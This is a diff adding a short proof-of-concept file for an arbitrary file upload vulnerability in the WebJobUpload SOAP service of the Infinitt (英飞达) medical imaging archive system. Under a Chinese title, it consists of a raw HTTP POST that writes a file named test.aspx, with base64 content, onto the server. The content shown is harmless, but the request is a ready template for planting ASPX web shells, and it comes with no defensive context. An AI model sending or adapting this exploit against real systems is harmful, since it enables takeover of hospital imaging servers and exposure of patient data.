@@ -1,0 +1,20 @@
+# 英飞达医学影像存档与通信系统WebJobUpload任意文件上传漏洞
+POST /webservices/WebJobUpload.asmx HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Content-Length: 392
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=utf-8
+Soapaction: "http://rainier/jobUpload"
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<jobUpload xmlns="http://rainier">
+<vcode>1</vcode>
+<subFolder></subFolder>
+<fileName>test.aspx</fileName>
+<bufValue>dGVzdA==</bufValue>
+</jobUpload>
+</soap:Body>
